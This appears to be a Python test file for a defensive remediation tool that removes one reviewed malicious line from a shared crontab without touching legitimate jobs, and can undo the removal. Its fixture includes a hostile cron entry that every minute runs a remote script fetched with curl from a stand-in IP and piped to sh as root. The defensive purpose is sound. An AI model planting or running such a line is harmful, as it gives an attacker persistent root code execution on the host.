"""Revoking one cron entry from a shared crontab (issue #16, Linux).

A schedule line added to /etc/crontab or a user crontab could not be removed
before: the file holds legitimate and teammate jobs, so removing it wholesale was
correctly refused. Only the exact reviewed line is removed here.
"""
import hashlib
import os
import shutil
import tempfile
import unittest
from pathlib import Path

from unittest.mock import patch

from sentinel_blue import persistence_security
from sentinel_blue.persistence_security import (
    PersistenceRemediator, cron_entries, cron_entry_digest, fingerprint,
    revoke_cron_lines, validate_target)


SHARED_CRONTAB = (b"# /etc/crontab: system-wide crontab\n"
                  b"SHELL=/bin/sh\n"
                  b"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n"
                  b"\n"
                  b"17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"
                  b"*/5 * * * * root /opt/team/backup.sh\n"
                  b"* * * * * root curl -s http://198.51.100.9/x.sh | sh\n")
MALICIOUS = b"* * * * * root curl -s http://198.51.100.9/x.sh | sh"


class CronEntryParsingTests(unittest.TestCase):
    def test_only_schedule_lines_are_targets(self):
        entries = cron_entries(SHARED_CRONTAB)
        self.assertEqual(len(entries), 3, 'comments, blanks and environment lines are not entries')
        digests = {entry['entry_sha256'] for entry in entries}
        self.assertIn(cron_entry_digest(MALICIOUS), digests)
        self.assertNotIn(cron_entry_digest(b'SHELL=/bin/sh'), digests)

    def test_shorthand_schedules_are_recognized(self):
        data = b'@reboot root /opt/team/warm-cache.sh\n@daily root /opt/team/rotate.sh\n'
        self.assertEqual(len(cron_entries(data)), 2)

    def test_a_commented_out_entry_is_not_a_target(self):
        data = b'#* * * * * root /tmp/evil.sh\n'
        self.assertEqual(cron_entries(data), [])

    def test_revocation_keeps_every_other_byte(self):
        after, removed = revoke_cron_lines(SHARED_CRONTAB, cron_entry_digest(MALICIOUS))
        self.assertEqual(removed, 1)
        self.assertNotIn(b'198.51.100.9', after)
        self.assertIn(b'/opt/team/backup.sh', after)
        self.assertIn(b'run-parts --report /etc/cron.hourly', after)
        self.assertIn(b'SHELL=/bin/sh', after)
        self.assertIn(b'# /etc/crontab: system-wide crontab', after)
        self.assertEqual(after, SHARED_CRONTAB.replace(MALICIOUS + b'\n', b''))

    def test_repeated_identical_entries_are_all_removed(self):
        data = SHARED_CRONTAB + MALICIOUS + b'\n'
        after, removed = revoke_cron_lines(data, cron_entry_digest(MALICIOUS))
        self.assertEqual(removed, 2)
        self.assertNotIn(b'198.51.100.9', after)

    def test_absent_entry_refuses_rather_than_writing(self):
        with self.assertRaises(ValueError):
            revoke_cron_lines(SHARED_CRONTAB, 'f' * 64)

    def test_whitespace_differences_are_not_the_same_entry(self):
        spaced = b'*  *  *  *  * root curl -s http://198.51.100.9/x.sh | sh'
        self.assertNotEqual(cron_entry_digest(spaced), cron_entry_digest(MALICIOUS))


class CronTargetValidationTests(unittest.TestCase):
    def target(self, path, digest=None):
        return {'kind': 'cron-entry', 'path': path,
                'entry_sha256': cron_entry_digest(MALICIOUS) if digest is None else digest}

    def test_reviewed_cron_locations_are_accepted(self):
        for path in ('/etc/crontab', '/etc/cron.d/team', '/var/spool/cron/root',
                     '/var/spool/cron/crontabs/www-data'):
            with self.subTest(path=path):
                self.assertEqual(validate_target(self.target(path))['path'], path)

    def test_other_files_are_refused(self):
        for path in ('/etc/passwd', '/etc/shadow', '/home/blue/notes.txt', '/etc/ssh/sshd_config',
                     '/etc/cron.daily/logrotate', '/etc/cron.d/../passwd', 'etc/crontab'):
            with self.subTest(path=path), self.assertRaises(ValueError):
                validate_target(self.target(path))

    def test_a_malformed_digest_is_refused(self):
        for digest in ('', 'abc', 'g' * 64, 'A' * 64):
            with self.subTest(digest=digest), self.assertRaises(ValueError):
                validate_target(self.target('/etc/crontab', digest))

    def test_unexpected_fields_are_refused(self):
        with self.assertRaises(ValueError):
            validate_target({**self.target('/etc/crontab'), 'service': 'x.service'})


@unittest.skipIf(os.name == 'nt', 'POSIX crontab files')
class CronRemediationTests(unittest.TestCase):
    def setUp(self):
        self.state = Path(tempfile.mkdtemp(prefix='sentinel-cron-state-'))
        self.addCleanup(shutil.rmtree, self.state, True)
        os.chmod(self.state, 0o700)
        self.host = Path(tempfile.mkdtemp(prefix='sentinel-cron-host-'))
        self.addCleanup(shutil.rmtree, self.host, True)
        self.crontab = self.host / 'crontab'
        self.crontab.write_bytes(SHARED_CRONTAB)
        os.chmod(self.crontab, 0o644)
        self.remediator = PersistenceRemediator(self.state, native=object())
        self.addCleanup(self.remediator.close)
        # The fixture crontab lives in a temporary directory, so this test class
        # treats that directory as a reviewed crontab location. The real
        # allowlist is exercised by CronTargetValidationTests above.
        patched = patch.object(persistence_security, 'CRON_ENTRY_DIRECTORIES',
                               (*persistence_security.CRON_ENTRY_DIRECTORIES, str(self.host)))
        patched.start()
        self.addCleanup(patched.stop)
        self.target = {'kind': 'cron-entry', 'path': str(self.crontab),
                       'entry_sha256': cron_entry_digest(MALICIOUS)}

    def test_remove_then_restore_round_trips_exactly(self):
        snapshot = self.remediator.snapshot(self.target)
        result = self.remediator.remove(self.target, fingerprint(snapshot), operation_id='cron-op-0001')
        self.assertEqual(result['status'], 'quarantined')
        self.assertEqual(result.get('evidence_preserved'), True)
        current = self.crontab.read_bytes()
        self.assertNotIn(b'198.51.100.9', current)
        self.assertIn(b'/opt/team/backup.sh', current)
        self.assertEqual(os.stat(self.crontab).st_mode & 0o777, 0o644)
        restored = self.remediator.restore('cron-op-0001')
        self.assertEqual(restored['status'], 'restored')
        self.assertEqual(self.crontab.read_bytes(), SHARED_CRONTAB)

    def test_removal_is_refused_when_the_file_changed_after_review(self):
        snapshot = self.remediator.snapshot(self.target)
        digest = fingerprint(snapshot)
        self.crontab.write_bytes(SHARED_CRONTAB + b'*/7 * * * * root /opt/team/new.sh\n')
        with self.assertRaises(ValueError):
            self.remediator.remove(self.target, digest, operation_id='cron-op-0002')
        self.assertIn(b'/opt/team/new.sh', self.crontab.read_bytes())

    def test_replaying_the_same_operation_does_not_remove_twice(self):
        snapshot = self.remediator.snapshot(self.target)
        digest = fingerprint(snapshot)
        first = self.remediator.remove(self.target, digest, operation_id='cron-op-0003')
        self.assertEqual(first['status'], 'quarantined')
        again = self.remediator.remove(self.target, digest, operation_id='cron-op-0003')
        self.assertFalse(again['replayed'])
        self.assertEqual(self.crontab.read_bytes().count(b'/opt/team/backup.sh'), 1)

    def test_an_absent_entry_is_refused_before_any_write(self):
        target = {**self.target, 'entry_sha256': 'a' * 64}
        with self.assertRaises(ValueError):
            self.remediator.snapshot(target)
        self.assertEqual(self.crontab.read_bytes(), SHARED_CRONTAB)


if __name__ == '__main__':
    unittest.main()
